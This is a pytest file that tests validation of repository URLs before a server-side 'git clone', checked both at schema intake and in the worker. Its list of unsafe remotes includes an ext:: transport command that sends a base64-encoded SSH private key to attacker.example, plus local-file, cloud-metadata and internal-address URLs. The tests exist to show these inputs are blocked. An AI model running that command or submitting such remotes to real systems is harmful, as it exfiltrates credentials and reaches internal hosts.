"""The dev_sandbox repo URL reaches `git clone` ON THE WORKER HOST.

Every other user-supplied URL in this app is fetched by an HTTP client that
``assert_public_url`` guards. This one is different in kind: it becomes argv for
a ``git clone`` subprocess that runs on the worker host, with the worker's own
environment, *before* ``DockerSandbox`` is constructed — so the sandbox's
network isolation cannot help, and ``clone_repo`` deliberately does not
validate (it must stay a dumb transport shared by callers with different trust
assumptions). That leaves exactly two places the check can live, and both are
pinned here: the submission schema, and the worker immediately before the
clone.

``ssh remotes DO authenticate here because git inherits the host env (~/.ssh
keys); the control is host validation, not scheme banning.`` The previous pass
at this bug inferred the opposite and banning the scheme broke a live feature
while closing nothing — ``https://10.0.0.5/x`` reaches the same internal host
as ``ssh://10.0.0.5/x``.
"""

import uuid
from subprocess import CompletedProcess
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from pydantic import ValidationError

from app.schemas.proof import DevSandboxProofSubmission
from app.services import verification_result as vr
from app.workers import dev_sandbox as ds

CHARGE_BOUNDARY = "app.workers.payments.process_charge_for_goal"

# Remotes that must never become argv for a clone on the worker host.
UNSAFE_REMOTES = [
    "file:///etc/passwd",
    "ext::sh -c 'curl http://attacker.example/$(cat ~/.ssh/id_ed25519 | base64)'",
    "http://169.254.169.254/",
    "ssh://git@10.0.0.5/x",
    "https://127.0.0.1:9200/x/y",
    "/srv/git/internal.git",
]

# Remotes a real user legitimately submits, including the ssh forms.
SAFE_REMOTES = [
    "https://github.com/owner/repo",
    "ssh://git@github.com/owner/repo",
    "git@github.com:owner/repo",
]


def _mock_db() -> AsyncMock:
    scoped = MagicMock()
    scoped.scalar_one_or_none.return_value = None
    db = AsyncMock()
    db.execute = AsyncMock(return_value=scoped)
    db.commit = AsyncMock()
    return db


def _recording_git():
    """Patch the git subprocess and record every invocation.

    The assertion that matters is ``calls == []``: a guard that refused the URL
    *after* the clone ran would be worthless, and asserting only on the returned
    status could not tell the two apart.
    """
    calls: list[list[str]] = []

    def _run(argv, **kwargs):
        calls.append(argv)
        return CompletedProcess(argv, 0, "", "")

    return patch.object(ds.subprocess, "run", _run), calls


# ─── boundary 1: the submission schema ─────────────────────────────────────


@pytest.mark.parametrize("url", UNSAFE_REMOTES)
def test_schema_rejects_unsafe_repo_url(url):
    """A 422 at intake, so the value is never stored and the pledge stays enforceable."""
    with pytest.raises(ValidationError):
        DevSandboxProofSubmission(repo_url=url)


@pytest.mark.parametrize("url", SAFE_REMOTES)
def test_schema_accepts_public_remotes_over_https_and_ssh(url):
    """ssh remotes DO authenticate here because git inherits the host env
    (~/.ssh keys); the control is host validation, not scheme banning."""
    assert DevSandboxProofSubmission(repo_url=url).repo_url == url


# ─── boundary 2: the worker, immediately before the clone ──────────────────


@pytest.mark.asyncio
@pytest.mark.parametrize("url", UNSAFE_REMOTES)
async def test_worker_never_clones_an_unsafe_submitted_remote(url):
    """Defensive half: rows predating the schema validator still must not clone."""
    patcher, calls = _recording_git()
    with patcher, patch(CHARGE_BOUNDARY, new_callable=AsyncMock):
        result = await ds.run_dev_sandbox_verification(
            goal_id=uuid.uuid4(),
            submission_id=uuid.uuid4(),
            proof_data={"repo_url": url, "test_command": "pytest"},
            criteria_data={},
            db=_mock_db(),
        )

    assert calls == [], f"git ran for {url!r}"
    # The submitter's own input, so it is a verdict — not a permanent
    # inconclusive, which would make the pledge uncollectable for free.
    assert result["verification_status"] == vr.FAILED
    assert result["verification_details"]["stage"] == "validation"


@pytest.mark.asyncio
async def test_worker_refuses_an_unsafe_remote_from_stored_criteria_without_charging():
    """We wrote the criteria, so it is our fault: inconclusive, never billed."""
    patcher, calls = _recording_git()
    with patcher, patch(CHARGE_BOUNDARY, new_callable=AsyncMock) as charge:
        result = await ds.run_dev_sandbox_verification(
            goal_id=uuid.uuid4(),
            submission_id=uuid.uuid4(),
            proof_data={},
            criteria_data={"repo_url": "file:///srv/secrets", "test_command": "pytest"},
            db=_mock_db(),
        )

    assert calls == []
    charge.assert_not_awaited()
    assert result["verification_status"] == vr.INCONCLUSIVE
    assert result["verification_details"]["stage"] == "criteria"


@pytest.mark.asyncio
@pytest.mark.parametrize("url", SAFE_REMOTES)
async def test_worker_still_clones_public_remotes_including_ssh(url):
    """ssh remotes DO authenticate here because git inherits the host env
    (~/.ssh keys); the control is host validation, not scheme banning.

    The guard is only correct if it is invisible to every legitimate
    submission — this is the half a scheme ban would have broken.
    """
    patcher, calls = _recording_git()
    # The clone "succeeds" into an empty tmpdir, so the run continues past the
    # guard and dies later on the sandbox; all this asserts is that git ran with
    # the URL the user gave us.
    with (
        patcher,
        patch.object(
            ds, "DockerSandbox", side_effect=ds.SandboxSetupError("stop here")
        ),
        patch(CHARGE_BOUNDARY, new_callable=AsyncMock),
    ):
        await ds.run_dev_sandbox_verification(
            goal_id=uuid.uuid4(),
            submission_id=uuid.uuid4(),
            proof_data={"repo_url": url, "test_command": "pytest"},
            criteria_data={},
            db=_mock_db(),
        )

    assert calls, f"the guard blocked a legitimate remote: {url!r}"
    assert url in calls[0]
